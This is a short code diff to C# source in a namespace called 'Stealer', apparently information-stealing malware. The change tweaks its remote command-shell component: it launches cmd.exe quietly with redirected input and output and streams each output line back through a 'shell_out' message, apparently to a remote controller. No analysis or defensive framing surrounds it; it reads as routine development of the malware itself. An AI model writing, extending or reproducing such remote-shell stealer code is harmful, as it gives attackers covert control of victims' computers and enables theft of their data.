@@ -181,7 +181,7 @@ namespace Stealer
             _cmdStreaming = false;
             try { _cmdShell?.Kill(); _cmdShell?.Dispose(); } catch { }
 
-            var psi = new ProcessStartInfo("cmd.exe")
+            var psi = new ProcessStartInfo("cmd.exe", "/Q")
             {
                 UseShellExecute        = false,
                 RedirectStandardInput  = true,
@@ -198,10 +198,7 @@ namespace Stealer
             {
                 if (e.Data == null) return;
                 if (!_cmdStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _cmdReady.Set(); return; }
-                // Strip cmd prompt prefix ("C:\path>") that gets prepended without newline
-                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^[A-Za-z]:\\[^>]*>", "");
-                if (!string.IsNullOrEmpty(line))
-                    SendShellLine("shell_out", line, "cmd", "");
+                SendShellLine("shell_out", e.Data, "cmd", "");
             };
             _cmdShell.ErrorDataReceived += (s, e) =>
             {
